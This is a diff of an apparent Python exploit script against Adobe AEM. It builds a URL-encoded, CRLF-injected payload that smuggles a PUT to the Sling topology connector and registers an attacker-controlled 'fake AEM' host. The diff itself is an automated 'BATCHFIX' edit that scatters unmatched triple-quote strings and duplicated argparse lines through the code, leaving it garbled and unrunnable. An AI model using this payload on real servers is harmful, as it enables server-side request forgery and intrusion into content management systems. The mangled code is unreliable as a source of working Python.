@@ -31,7 +31,7 @@ def http_request(url, method="GET", data=None, additional_headers=None, proxy=No
         proxy = {}
 
 # [BATCHFIX] Commented metadata/non-Python
-# # [BATCHFIX] Commented unmatched parenthesis
+""" [BATCHFIX] Commented unmatched parenthesis
 #     resp = requests.request(
         method, url, data=data, headers=headers, proxies=proxy, verify=False, timeout=15, allow_redirects=False
     )
@@ -42,114 +42,114 @@ def http_request(url, method="GET", data=None, additional_headers=None, proxy=No
 def exploit(url, fakeaem, proxy=None):
     # We suppose that AEM publish instance is on http://localhost:4503
 # [BATCHFIX] Commented metadata/non-Python
-# # [BATCHFIX] Commented unmatched parenthesis
+""" [BATCHFIX] Commented unmatched parenthesis
 #     JSON_DATA = (
 # [BATCHFIX] Commented metadata/non-Python
-# #         "%7B%22ownerId%22%3A%22{0}%22%2C%22protocolVersion%22%3A1%2C%22created%22%3A1529002154280%2C"  # [BATCHFIX] closed string
+"""         "%7B%22ownerId%22%3A%22{0}%22%2C%22protocolVersion%22%3A1%2C%22created%22%3A1529002154280%2C"  # [BATCHFIX] closed string
 # [BATCHFIX] Commented metadata/non-Python
-# #         "%22inherited%22%3Afalse%2C%22serverInfo%22%3A%22{1}%3A80%22%2C%22localClusterView%22%3A%7B"  # [BATCHFIX] closed string
+"""         "%22inherited%22%3Afalse%2C%22serverInfo%22%3A%22{1}%3A80%22%2C%22localClusterView%22%3A%7B"  # [BATCHFIX] closed string
 # [BATCHFIX] Commented metadata/non-Python
-# #         "%22id%22%3A%22909ad6e7-463b-49b4-ba75-917112c8e530%22%2C%22instances%22%3A%5B%7B%22slingId"  # [BATCHFIX] closed string
+"""         "%22id%22%3A%22909ad6e7-463b-49b4-ba75-917112c8e530%22%2C%22instances%22%3A%5B%7B%22slingId"  # [BATCHFIX] closed string
 # [BATCHFIX] Commented metadata/non-Python
-# #         "%22%3A%22{0}%22%2C%22isLeader%22%3Atrue%2C%22cluster%22%3A%22665ad6e7-463b-49b4-ba75-91711"  # [BATCHFIX] closed string
+"""         "%22%3A%22{0}%22%2C%22isLeader%22%3Atrue%2C%22cluster%22%3A%22665ad6e7-463b-49b4-ba75-91711"  # [BATCHFIX] closed string
 # [BATCHFIX] Commented metadata/non-Python
-# #         "2c8e530%22%2C%22properties%22%3A%7B%22org%2Eapache%2Esling%2Einstance%2Eendpoints%22%3A%22"  # [BATCHFIX] closed string
+"""         "2c8e530%22%2C%22properties%22%3A%7B%22org%2Eapache%2Esling%2Einstance%2Eendpoints%22%3A%22"  # [BATCHFIX] closed string
 # [BATCHFIX] Commented metadata/non-Python
-# #         "http%3A//{1}%3A80/%22%2C%22org%2Eapache%2Esling%2Eevent%2Ejobs%2Econsumer%2Etopics%22%3A%22"  # [BATCHFIX] closed string
+"""         "http%3A//{1}%3A80/%22%2C%22org%2Eapache%2Esling%2Eevent%2Ejobs%2Econsumer%2Etopics%22%3A%22"  # [BATCHFIX] closed string
 # [BATCHFIX] Commented metadata/non-Python
-# #         "ADD-ASSET-USAGE%2Ccom/adobe/aem/formsndocuments/scheduler/formreplication%2Ccom/adobe/cq/da"  # [BATCHFIX] closed string
+"""         "ADD-ASSET-USAGE%2Ccom/adobe/aem/formsndocuments/scheduler/formreplication%2Ccom/adobe/cq/da"  # [BATCHFIX] closed string
 # [BATCHFIX] Commented metadata/non-Python
-# #         "m/assetmove%2Ccom/adobe/cq/dam/dmassetreplicateonmodify%2Ccom/adobe/cq/wcm/launches/autopromo"  # [BATCHFIX] closed string
+"""         "m/assetmove%2Ccom/adobe/cq/dam/dmassetreplicateonmodify%2Ccom/adobe/cq/wcm/launches/autopromo"  # [BATCHFIX] closed string
 # [BATCHFIX] Commented metadata/non-Python
-# #         "te%2Ccom/adobe/cq/workflow/payload/move/job%2Ccom/adobe/granite/maintenance/job/AuditLogMainte"  # [BATCHFIX] closed string
+"""         "te%2Ccom/adobe/cq/workflow/payload/move/job%2Ccom/adobe/granite/maintenance/job/AuditLogMainte"  # [BATCHFIX] closed string
 # [BATCHFIX] Commented metadata/non-Python
-# #         "nanceTask%2Ccom/adobe/granite/maintenance/job/DataStoreGarbageCollectionTask%2Ccom/adobe/grani"  # [BATCHFIX] closed string
+"""         "nanceTask%2Ccom/adobe/granite/maintenance/job/DataStoreGarbageCollectionTask%2Ccom/adobe/grani"  # [BATCHFIX] closed string
 # [BATCHFIX] Commented metadata/non-Python
-# #         "te/maintenance/job/RevisionCleanupTask%2Ccom/adobe/granite/maintenance/job/VersionPurgeTask%2"  # [BATCHFIX] closed string
+"""         "te/maintenance/job/RevisionCleanupTask%2Ccom/adobe/granite/maintenance/job/VersionPurgeTask%2"  # [BATCHFIX] closed string
 # [BATCHFIX] Commented metadata/non-Python
-# #         "Ccom/adobe/granite/maintenance/job/WorkflowPurgeTask%2Ccom/adobe/granite/workflow/external/jo"  # [BATCHFIX] closed string
+"""         "Ccom/adobe/granite/maintenance/job/WorkflowPurgeTask%2Ccom/adobe/granite/workflow/external/jo"  # [BATCHFIX] closed string
 # [BATCHFIX] Commented metadata/non-Python
-# #         "b%2Ccom/adobe/granite/workflow/external/job/%2A%2A%2Ccom/adobe/granite/workflow/external/pol"  # [BATCHFIX] closed string
+"""         "b%2Ccom/adobe/granite/workflow/external/job/%2A%2A%2Ccom/adobe/granite/workflow/external/pol"  # [BATCHFIX] closed string
 # [BATCHFIX] Commented metadata/non-Python
-# #         "ling/event%2Ccom/adobe/granite/workflow/external/polling/event/%2A%2A%2Ccom/adobe/granite/wor"  # [BATCHFIX] closed string
+"""         "ling/event%2Ccom/adobe/granite/workflow/external/polling/event/%2A%2A%2Ccom/adobe/granite/wor"  # [BATCHFIX] closed string
 # [BATCHFIX] Commented metadata/non-Python
-# #         "kflow/job%2Ccom/adobe/granite/workflow/job/%2A%2A%2Ccom/adobe/granite/workflow/offloading%2Cc"  # [BATCHFIX] closed string
+"""         "kflow/job%2Ccom/adobe/granite/workflow/job/%2A%2A%2Ccom/adobe/granite/workflow/offloading%2Cc"  # [BATCHFIX] closed string
 # [BATCHFIX] Commented metadata/non-Python
-# #         "om/adobe/granite/workflow/timeout/job%2Ccom/adobe/granite/workflow/timeout/job/%2A%2A%2Ccom/a"  # [BATCHFIX] closed string
+"""         "om/adobe/granite/workflow/timeout/job%2Ccom/adobe/granite/workflow/timeout/job/%2A%2A%2Ccom/a"  # [BATCHFIX] closed string
 # [BATCHFIX] Commented metadata/non-Python
-# #         "dobe/granite/workflow/transient/job/%2A%2A%2Ccom/adobe/integrations/target/ambitchange%2Ccom/a"  # [BATCHFIX] closed string
+"""         "dobe/granite/workflow/transient/job/%2A%2A%2Ccom/adobe/integrations/target/ambitchange%2Ccom/a"  # [BATCHFIX] closed string
 # [BATCHFIX] Commented metadata/non-Python
-# #         "dobe/integrations/target/pushauthorcampaign%2Ccom/dam/cq/scene7/importer/%2A%2Ccom/day/cq/aud"  # [BATCHFIX] closed string
+"""         "dobe/integrations/target/pushauthorcampaign%2Ccom/dam/cq/scene7/importer/%2A%2Ccom/day/cq/aud"  # [BATCHFIX] closed string
 # [BATCHFIX] Commented metadata/non-Python
-# #         "it/job%2Ccom/day/cq/dam/s7dam/update/job%2Ccom/day/cq/personalization/teaserevent%2Ccom/day/c"  # [BATCHFIX] closed string
+"""         "it/job%2Ccom/day/cq/dam/s7dam/update/job%2Ccom/day/cq/personalization/teaserevent%2Ccom/day/c"  # [BATCHFIX] closed string
 # [BATCHFIX] Commented metadata/non-Python
-# #         "q/replication/job/%2A%2Ccommentjobtopic%2Ccq/personalization/audiencemanager/sync%2Cdam/proxy"  # [BATCHFIX] closed string
+"""         "q/replication/job/%2A%2Ccommentjobtopic%2Ccq/personalization/audiencemanager/sync%2Cdam/proxy"  # [BATCHFIX] closed string
 # [BATCHFIX] Commented metadata/non-Python
-# #         "/ids/job%2Cdam/scene7/asset/activation%2Cgroupeventjobtopic%2Corg/apache/sling/distribution/q"  # [BATCHFIX] closed string
+"""         "/ids/job%2Cdam/scene7/asset/activation%2Cgroupeventjobtopic%2Corg/apache/sling/distribution/q"  # [BATCHFIX] closed string
 # [BATCHFIX] Commented metadata/non-Python
-# #         "ueue/publish/endpoint0%2Corg/apache/sling/event/impl/jobs/tasks/HistoryCleanUpTask%2Cratingjo"  # [BATCHFIX] closed string
+"""         "ueue/publish/endpoint0%2Corg/apache/sling/event/impl/jobs/tasks/HistoryCleanUpTask%2Cratingjo"  # [BATCHFIX] closed string
 # [BATCHFIX] Commented metadata/non-Python
-# #         "btopic%2Cresourcejobtopic%2Csling/webconsole/test%2Cusereventjobtopic%22%2C%22job%2Econsumer"  # [BATCHFIX] closed string
+"""         "btopic%2Cresourcejobtopic%2Csling/webconsole/test%2Cusereventjobtopic%22%2C%22job%2Econsumer"  # [BATCHFIX] closed string
 # [BATCHFIX] Commented metadata/non-Python
-# #         "manager%2Ewhitelist%22%3A%22%2A%22%2C%22com%2Eadobe%2Egranite%2Eoffloading%2Ejob%2Eregisteredto"  # [BATCHFIX] closed string
+"""         "manager%2Ewhitelist%22%3A%22%2A%22%2C%22com%2Eadobe%2Egranite%2Eoffloading%2Ejob%2Eregisteredto"  # [BATCHFIX] closed string
 # [BATCHFIX] Commented metadata/non-Python
-# #         "pics%22%3A%22ADD-ASSET-USAGE%2Ccom/adobe/aem/formsndocuments/scheduler/formreplication%2Ccom/a"  # [BATCHFIX] closed string
+"""         "pics%22%3A%22ADD-ASSET-USAGE%2Ccom/adobe/aem/formsndocuments/scheduler/formreplication%2Ccom/a"  # [BATCHFIX] closed string
 # [BATCHFIX] Commented metadata/non-Python
-# #         "dobe/cq/dam/assetmove%2Ccom/adobe/cq/dam/dmassetreplicateonmodify%2Ccom/adobe/cq/wcm/launches/a"  # [BATCHFIX] closed string
+"""         "dobe/cq/dam/assetmove%2Ccom/adobe/cq/dam/dmassetreplicateonmodify%2Ccom/adobe/cq/wcm/launches/a"  # [BATCHFIX] closed string
 # [BATCHFIX] Commented metadata/non-Python
-# #         "utopromote%2Ccom/adobe/cq/workflow/payload/move/job%2Ccom/adobe/granite/maintenance/job/AuditLo"  # [BATCHFIX] closed string
+"""         "utopromote%2Ccom/adobe/cq/workflow/payload/move/job%2Ccom/adobe/granite/maintenance/job/AuditLo"  # [BATCHFIX] closed string
 # [BATCHFIX] Commented metadata/non-Python
-# #         "gMaintenanceTask%2Ccom/adobe/granite/maintenance/job/DataStoreGarbageCollectionTask%2Ccom/adobe"  # [BATCHFIX] closed string
+"""         "gMaintenanceTask%2Ccom/adobe/granite/maintenance/job/DataStoreGarbageCollectionTask%2Ccom/adobe"  # [BATCHFIX] closed string
 # [BATCHFIX] Commented metadata/non-Python
-# #         "/granite/maintenance/job/RevisionCleanupTask%2Ccom/adobe/granite/maintenance/job/VersionPurgeT"  # [BATCHFIX] closed string
+"""         "/granite/maintenance/job/RevisionCleanupTask%2Ccom/adobe/granite/maintenance/job/VersionPurgeT"  # [BATCHFIX] closed string
 # [BATCHFIX] Commented metadata/non-Python
-# #         "ask%2Ccom/adobe/granite/maintenance/job/WorkflowPurgeTask%2Ccom/adobe/granite/workflow/externa"  # [BATCHFIX] closed string
+"""         "ask%2Ccom/adobe/granite/maintenance/job/WorkflowPurgeTask%2Ccom/adobe/granite/workflow/externa"  # [BATCHFIX] closed string
 # [BATCHFIX] Commented metadata/non-Python
-# #         "l/job%2Ccom/adobe/granite/workflow/external/job/%2A%2A%2Ccom/adobe/granite/workflow/external/p"  # [BATCHFIX] closed string
+"""         "l/job%2Ccom/adobe/granite/workflow/external/job/%2A%2A%2Ccom/adobe/granite/workflow/external/p"  # [BATCHFIX] closed string
 # [BATCHFIX] Commented metadata/non-Python
-# #         "olling/event%2Ccom/adobe/granite/workflow/external/polling/event/%2A%2A%2Ccom/adobe/granite/wo"  # [BATCHFIX] closed string
+"""         "olling/event%2Ccom/adobe/granite/workflow/external/polling/event/%2A%2A%2Ccom/adobe/granite/wo"  # [BATCHFIX] closed string
 # [BATCHFIX] Commented metadata/non-Python
-# #         "rkflow/job%2Ccom/adobe/granite/workflow/job/%2A%2A%2Ccom/adobe/granite/workflow/offloading%2Cc"  # [BATCHFIX] closed string
+"""         "rkflow/job%2Ccom/adobe/granite/workflow/job/%2A%2A%2Ccom/adobe/granite/workflow/offloading%2Cc"  # [BATCHFIX] closed string
 # [BATCHFIX] Commented metadata/non-Python
-# #         "om/adobe/granite/workflow/timeout/job%2Ccom/adobe/granite/workflow/timeout/job/%2A%2A%2Ccom/ad"  # [BATCHFIX] closed string
+"""         "om/adobe/granite/workflow/timeout/job%2Ccom/adobe/granite/workflow/timeout/job/%2A%2A%2Ccom/ad"  # [BATCHFIX] closed string
 # [BATCHFIX] Commented metadata/non-Python
-# #         "obe/granite/workflow/transient/job/%2A%2A%2Ccom/adobe/integrations/target/ambitchange%2Ccom/ad"  # [BATCHFIX] closed string
+"""         "obe/granite/workflow/transient/job/%2A%2A%2Ccom/adobe/integrations/target/ambitchange%2Ccom/ad"  # [BATCHFIX] closed string
 # [BATCHFIX] Commented metadata/non-Python
-# #         "obe/integrations/target/pushauthorcampaign%2Ccom/dam/cq/scene7/importer/%2A%2Ccom/day/cq/audi"  # [BATCHFIX] closed string
+"""         "obe/integrations/target/pushauthorcampaign%2Ccom/dam/cq/scene7/importer/%2A%2Ccom/day/cq/audi"  # [BATCHFIX] closed string
 # [BATCHFIX] Commented metadata/non-Python
-# #         "t/job%2Ccom/day/cq/dam/s7dam/update/job%2Ccom/day/cq/personalization/teaserevent%2Ccom/day/cq"  # [BATCHFIX] closed string
+"""         "t/job%2Ccom/day/cq/dam/s7dam/update/job%2Ccom/day/cq/personalization/teaserevent%2Ccom/day/cq"  # [BATCHFIX] closed string
 # [BATCHFIX] Commented metadata/non-Python
-# #         "/replication/job/%2A%2Ccommentjobtopic%2Ccq/personalization/audiencemanager/sync%2Cdam/proxy/"  # [BATCHFIX] closed string
+"""         "/replication/job/%2A%2Ccommentjobtopic%2Ccq/personalization/audiencemanager/sync%2Cdam/proxy/"  # [BATCHFIX] closed string
 # [BATCHFIX] Commented metadata/non-Python
-# #         "ids/job%2Cdam/scene7/asset/activation%2Cgroupeventjobtopic%2Corg/apache/sling/distribution/qu"  # [BATCHFIX] closed string
+"""         "ids/job%2Cdam/scene7/asset/activation%2Cgroupeventjobtopic%2Corg/apache/sling/distribution/qu"  # [BATCHFIX] closed string
 # [BATCHFIX] Commented metadata/non-Python
-# #         "eue/publish/endpoint0%2Corg/apache/sling/event/impl/jobs/tasks/HistoryCleanUpTask%2Cratingjobt"  # [BATCHFIX] closed string
+"""         "eue/publish/endpoint0%2Corg/apache/sling/event/impl/jobs/tasks/HistoryCleanUpTask%2Cratingjobt"  # [BATCHFIX] closed string
 # [BATCHFIX] Commented metadata/non-Python
-# #         "opic%2Cresourcejobtopic%2Csling/webconsole/test%2Cusereventjobtopic%22%2C%22org%2Eapache%2Esl"  # [BATCHFIX] closed string
+"""         "opic%2Cresourcejobtopic%2Csling/webconsole/test%2Cusereventjobtopic%22%2C%22org%2Eapache%2Esl"  # [BATCHFIX] closed string
 # [BATCHFIX] Commented metadata/non-Python
-# #         "ing%2Einstance%2Ename%22%3A%22Instance%20{0}%22%2C%22com%2Eadobe%2Egranite%2Eoffloading%2Einfr"  # [BATCHFIX] closed string
+"""         "ing%2Einstance%2Ename%22%3A%22Instance%20{0}%22%2C%22com%2Eadobe%2Egranite%2Eoffloading%2Einfr"  # [BATCHFIX] closed string
 # [BATCHFIX] Commented metadata/non-Python
-# #         "astructure%2Eosgiconsole%2Epath%22%3A%22/system/console%22%2C%22job%2Econsumermanager%2Eblackl"  # [BATCHFIX] closed string
+"""         "astructure%2Eosgiconsole%2Epath%22%3A%22/system/console%22%2C%22job%2Econsumermanager%2Eblackl"  # [BATCHFIX] closed string
 # [BATCHFIX] Commented metadata/non-Python
-# #         "ist%22%3A%22%22%2C%22org%2Eapache%2Esling%2Einstance%2Edescription%22%3A%22Instance%20xxxxx"  # [BATCHFIX] closed string
+"""         "ist%22%3A%22%22%2C%22org%2Eapache%2Esling%2Einstance%2Edescription%22%3A%22Instance%20xxxxx"  # [BATCHFIX] closed string
 # [BATCHFIX] Commented metadata/non-Python
-# #         "%22%7D%7D%5D%7D%2C%22topologyAnnouncements%22%3A%5B%5D%7D"  # [BATCHFIX] closed string
+"""         "%22%7D%7D%5D%7D%2C%22topologyAnnouncements%22%3A%5B%5D%7D"  # [BATCHFIX] closed string
     )
 # [BATCHFIX] Commented metadata/non-Python
-# # [BATCHFIX] Commented unmatched parenthesis
+""" [BATCHFIX] Commented unmatched parenthesis
 #     PARAMS = (
 # [BATCHFIX] Commented metadata/non-Python
-# #         "?datacenter=http://localhost:4503/xxxx%23&company=xxx&username=x%22%0A"  # [BATCHFIX] closed string
+"""         "?datacenter=http://localhost:4503/xxxx%23&company=xxx&username=x%22%0A"  # [BATCHFIX] closed string
 # [BATCHFIX] Commented metadata/non-Python
-# #         "Host%3A%20localhost%3A4503%0AContent-Length%3A0%0A%0A"  # [BATCHFIX] closed string
+"""         "Host%3A%20localhost%3A4503%0AContent-Length%3A0%0A%0A"  # [BATCHFIX] closed string
 # [BATCHFIX] Commented metadata/non-Python
-# #         "PUT%20/libs/sling/topology/connector%2E{0}%2Ejson%20HTTP/1%2E0%0A"  # [BATCHFIX] closed string
+"""         "PUT%20/libs/sling/topology/connector%2E{0}%2Ejson%20HTTP/1%2E0%0A"  # [BATCHFIX] closed string
 # [BATCHFIX] Commented metadata/non-Python
-# #         "Host%3A%20localhost%3A4503%0AConnection%3A%20keep-alive%0A"  # [BATCHFIX] closed string
+"""         "Host%3A%20localhost%3A4503%0AConnection%3A%20keep-alive%0A"  # [BATCHFIX] closed string
 # [BATCHFIX] Commented metadata/non-Python
-# #         "Content-Length%3A%20{1}%0AContent-Type%3A%20application/json%0A%0A"  # [BATCHFIX] closed string
+"""         "Content-Length%3A%20{1}%0AContent-Type%3A%20application/json%0A%0A"  # [BATCHFIX] closed string
 # [BATCHFIX] Commented metadata/non-Python
-# #         "{2}%0A%0AGET%20/%20HTTP/1%2E1%0AHost%3Alocalhost%3A4503%0A&secret=yyyy"  # [BATCHFIX] closed string
+"""         "{2}%0A%0AGET%20/%20HTTP/1%2E1%0AHost%3Alocalhost%3A4503%0A&secret=yyyy"  # [BATCHFIX] closed string
     )
 
     exploit_id = uuid.uuid4()
@@ -166,25 +166,25 @@ def parse_args():
     parser = argparse.ArgumentParser()
 
 # [BATCHFIX] Commented metadata/non-Python
-# # [BATCHFIX] Commented unmatched parenthesis
+""" [BATCHFIX] Commented unmatched parenthesis
 #     parser.add_argument(
 # [BATCHFIX] Commented metadata/non-Python
-# #         "--url", help="URL for SitecatalystServlet or AutoprovisioningServlet, including path, without query part"  # [BATCHFIX] closed string
+"""         "--url", help="URL for SitecatalystServlet or AutoprovisioningServlet, including path, without query part"  # [BATCHFIX] closed string
     )
     parser.add_argument("--fakeaem", help="hostname/ip of fake AEM server")
     parser.add_argument("--proxy", help="http and https proxy")
 
 # [BATCHFIX] Commented metadata/non-Python
-# # [BATCHFIX] Commented metadata/non-Python
+""" [BATCHFIX] Commented metadata/non-Python
 # [BATCHFIX] Commented metadata/non-Python
-# #     return parser.parse_args(sys.argv[1:])
+"""     return parser.parse_args(sys.argv[1:])
     parser.add_argument("--fakeaem", help="hostname/ip of fake AEM server")
     parser.add_argument("--proxy", help="http and https proxy")
 
 # [BATCHFIX] Commented metadata/non-Python
-# # [BATCHFIX] Commented metadata/non-Python
+""" [BATCHFIX] Commented metadata/non-Python
 # [BATCHFIX] Commented metadata/non-Python
-# #     return parser.parse_args(sys.argv[1:])
+"""     return parser.parse_args(sys.argv[1:])
 
 
 def main():
@@ -205,5 +205,5 @@ def main():
 
 if __name__ == "__main__":
 # [BATCHFIX] Commented metadata/non-Python
-# # [BATCHFIX] Commented metadata/non-Python
+""" [BATCHFIX] Commented metadata/non-Python
 #     main()
